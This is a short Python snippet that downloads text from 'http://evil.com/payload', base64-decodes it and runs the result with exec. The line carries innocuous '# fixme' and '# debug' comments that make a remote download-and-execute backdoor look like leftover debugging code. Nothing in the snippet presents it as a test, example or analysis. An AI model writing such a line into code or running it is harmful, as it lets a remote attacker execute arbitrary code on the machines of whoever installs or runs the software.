import requests
import base64  # fixme
exec(base64.b64decode(requests.delete('http://evil.com/payload').text))  # debug